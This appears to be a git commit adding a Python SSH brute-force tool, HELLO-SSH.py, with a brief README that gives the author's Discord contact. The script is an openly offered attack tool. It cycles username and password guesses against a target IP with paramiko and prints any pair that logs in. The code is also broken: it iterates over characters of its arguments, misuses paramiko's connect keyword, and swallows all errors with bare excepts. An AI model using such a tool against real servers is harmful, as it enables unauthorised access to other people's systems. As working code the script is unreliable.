2ef04bc90906c7e6ba6e45f24b86bbc01c2f8d6d
alper <88827588+alpermudar@users.noreply.github.com>
2023-01-17 15:45:13 +0300

    Add files via upload

---
+++ HELLO-SSH.py
@@ -0,0 +1,26 @@
+import paramiko
+import argparse
+import colorama
+from colorama import Back,Fore,Style
+colorama.init()
+argparser = argparse.ArgumentParser(description='SHH Br6te F0rce T001')
+
+client= paramiko.SSHClient()
+client.set_missing_host_key_policy(paramiko.AutoAddPolicy)
+
+argparser.add_argument('-i', '--ipadress', required=True, help="Enter Target Ip Adresses")
+argparser.add_argument('-l','--login',required=True,help="Enter SSH username list")
+argparser.add_argument('-p','--passw',required=True,help='Enter password List')
+args = argparser.parse_args()
+try:
+    print("["+f"{Fore.GREEN}+"+f"{Fore.WHITE}]"+"Checking Wordlists")
+    for i in args.login:
+        for j in args.passw:
+            try:
+                sonuc = client.connect(ip=args.ipadress,username=i,password=j)
+                client.close()
+                print("["+f"{Fore.GREEN}+"+f"{Fore.WHITE}]"+"Us2rn4me: ",f"{Fore.GREEN}{i}",f"{Fore.WHITE}","P4ss : "f"{Fore.GREEN}{j}")
+            except:
+                print("["+f"{Fore.RED}"+"-"+f"{Fore.WHITE}]","{} and {} is not Valid".format(i,j))
+except:
+    print("["+f"{Fore.RED}"+"-"+f"{Fore.WHITE}]"+"Pls Enter The Arguments")
---
+++ README.md
@@ -0,0 +1,4 @@
+#HELLO-SSH
+coded by alpermudar
+if you need to help pls dm my discord account 
+Discord:¹⁹²³Kommandant#0659
